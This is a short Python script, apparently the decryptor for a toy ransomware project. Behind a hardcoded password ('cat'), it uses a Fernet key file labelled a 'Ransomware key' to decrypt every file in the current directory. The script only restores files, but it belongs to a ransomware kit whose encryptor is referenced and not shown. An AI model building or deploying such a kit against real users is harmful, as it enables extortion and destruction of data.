import os
from cryptography.fernet import Fernet


# Files.
files = []
for file in os.listdir():
    if file in ("aries.py", "rskey.key", "decrypt.py"):
        continue
    if os.path.isfile(file):
        files.append(file)

# Ransomware key.
with open("rskey.key", "rb") as rskey:
    secretkey = rskey.read()

# Decryption.
password = "cat"
user_phrase = input("Enter the password: ")

if user_phrase == password:
    for file in files:
        with open(file, "rb") as f:
            contents = f.read()
        decypted_c = Fernet(secretkey).decrypt(contents)
        with open(file, "wb") as f:
            f.write(decypted_c)
    print("Congrats! Your files are decrypted.")
else:
    print("Wrong password.")
